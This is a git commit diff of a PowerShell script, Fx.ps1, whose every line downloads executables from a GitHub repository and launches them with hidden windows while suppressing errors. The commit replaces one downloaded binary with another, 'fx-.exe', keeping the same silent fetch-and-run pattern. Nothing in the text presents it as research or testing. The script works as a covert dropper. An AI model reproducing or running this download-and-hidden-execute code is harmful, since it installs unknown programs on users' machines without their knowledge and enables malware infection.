984bbdfbd194a6992bb567af1b04c3ccc8927252
svhosf <markijannshtoyko@gmail.com>
2026-03-15 01:41:23 +0200

    Fx.ps1

--- Fx.ps1
+++ Fx.ps1
@@ -1,4 +1,4 @@
 Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/mixer.exe" -OutFile "mixer.exe" -ErrorAction SilentlyContinue
     Start-Process -FilePath "mixer.exe" -WindowStyle Hidden
-Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/_fx.exe" -OutFile "_fx.exe" -ErrorAction SilentlyContinue
-    Start-Process -FilePath "_fx.exe" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/fx-.exe" -OutFile "fx-.exe" -ErrorAction SilentlyContinue
+    Start-Process -FilePath "fx-.exe" -WindowStyle Hidden
